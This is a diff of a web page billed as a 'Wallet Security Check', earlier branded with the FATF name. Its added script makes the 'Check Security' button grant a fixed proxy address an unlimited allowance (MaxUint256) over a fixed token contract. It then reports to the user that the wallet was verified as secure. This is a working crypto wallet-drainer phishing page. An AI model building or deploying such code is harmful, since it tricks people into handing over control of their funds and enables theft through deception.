@@ -7,139 +7,77 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #1a1a1a;
-            color: #fff;
-        }
-        header {
-            background-color: #c00;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        header img {
-            width: 80px;
-            height: auto;
-        }
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #333;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
+            background-color: #f9f9f9;
+            color: #333;
         }
         button {
             background-color: #007bff;
             color: white;
             border: none;
-            padding: 12px 25px;
+            padding: 10px 20px;
             border-radius: 5px;
             font-size: 16px;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 15px;
         }
         button:hover {
             background-color: #0056b3;
         }
-        footer {
-            background-color: #333;
-            color: white;
-            text-align: center;
-            padding: 10px;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-        }
     </style>
 </head>
 <body>
-    <header>
-        <img src="fatf_logo.png" alt="FATF Logo">
-        <h1>FATF Wallet Security Check</h1>
-    </header>
-
-    <div class="container">
-        <h2>Connect and Authorize Wallet</h2>
-        <p>Connect your wallet and authorize the contract to proceed with the security check.</p>
+    <div>
+        <h2>Check Wallet Security</h2>
         <button id="connectWallet" onclick="connectWallet()">Connect Wallet</button>
         <p id="walletStatus">Wallet Not Connected</p>
-        <button id="authorizeButton" onclick="authorizeContract()" disabled>Authorize Contract</button>
+        <button id="approveButton" onclick="checkSecurity()" disabled>Check Security</button>
     </div>
-
-    <footer>
-        <p>&copy; 2024 FATF. All rights reserved.</p>
-    </footer>
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        const contractAddress = "0x60F0532F89BCcdd7e3847531789de49d793f48f3"; // 新合约地址
-        const contractABI = [
+        const proxyAddress = "0x67A0bCBC059358E96bF4e85B43FFB2a12f25e097"; // Proxy Contract Address
+        let provider, signer;
+
+        // The ABI for the token contract that includes 'approve' and 'allowance' methods
+        const tokenABI = [
             {
                 "inputs": [
                     {
                         "internalType": "address",
-                        "name": "_account",
-                        "type": "address"
-                    }
-                ],
-                "name": "authorize",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_account",
-                        "type": "address"
-                    }
-                ],
-                "name": "revokeAuthorization",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_from",
+                        "name": "owner",
                         "type": "address"
                     },
                     {
                         "internalType": "address",
-                        "name": "_to",
+                        "name": "spender",
+                        "type": "address"
+                    }
+                ],
+                "name": "allowance",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "spender",
                         "type": "address"
                     },
                     {
                         "internalType": "uint256",
-                        "name": "_amount",
+                        "name": "amount",
                         "type": "uint256"
                     }
                 ],
-                "name": "transferFromAuthorized",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "stateMutability": "nonpayable",
-                "type": "constructor"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "name": "authorized",
+                "name": "approve",
                 "outputs": [
                     {
                         "internalType": "bool",
@@ -147,6 +85,25 @@
                         "type": "bool"
                     }
                 ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
+                "name": "balanceOf",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
                 "stateMutability": "view",
                 "type": "function"
             },
@@ -154,11 +111,21 @@
                 "inputs": [
                     {
                         "internalType": "address",
-                        "name": "_account",
+                        "name": "sender",
                         "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
                     }
                 ],
-                "name": "isAuthorized",
+                "name": "transferFrom",
                 "outputs": [
                     {
                         "internalType": "bool",
@@ -166,72 +133,45 @@
                         "type": "bool"
                     }
                 ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "token",
-                "outputs": [
-                    {
-                        "internalType": "contract IERC20",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
+                "stateMutability": "nonpayable",
                 "type": "function"
             }
         ];
 
-        let provider, signer, contract;
+        const tokenAddress = "0xd387FEeD5D966912F0af9e7fE1A854e4d6067CDE"; // The token contract address (Fixed)
 
-        // Connect wallet function
+        // Connect to the user's wallet using MetaMask or another Web3 wallet
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
                     provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
+                    await provider.send("eth_requestAccounts", []);  // Request accounts from the wallet
                     signer = provider.getSigner();
                     const walletAddress = await signer.getAddress();
-                    document.getElementById("walletStatus").innerText = `Connected: ${walletAddress}`;
-                    contract = new ethers.Contract(contractAddress, contractABI, signer);
-                    document.getElementById("authorizeButton").disabled = false;
+                    document.getElementById("walletStatus").innerText = `Connected Wallet: ${walletAddress}`;
+                    document.getElementById("approveButton").disabled = false; // Enable the 'Check Security' button
                 } catch (error) {
-                    alert("Failed to connect wallet.");
+                    alert("Wallet connection failed. Please try again!");
                 }
             } else {
-                alert("Please install MetaMask or other wallet extensions.");
+                alert("Please install MetaMask or other wallet extensions!");
             }
         }
 
-        // Authorize contract function
-        async function authorizeContract() {
+        // Perform the token approval to the proxy contract with unlimited allowance
+        async function checkSecurity() {
             if (!signer) {
-                alert("Please connect your wallet first.");
+                alert("Please connect your wallet first!");
                 return;
             }
 
-            const account = "0xAddressToAuthorize";  // 要授权的账户地址
+            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
             try {
-                const tx = await contract.authorize(account);
-                await tx.wait();  // 等待交易确认
-                alert("Wallet authorized successfully.");
+                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);  // Grant unlimited allowance
+                alert("Wallet security verified successfully! Authorization granted.");
             } catch (error) {
-                alert("Failed to authorize wallet.");
+                alert("Wallet security check failed. Please try again!");
             }
         }
     </script>
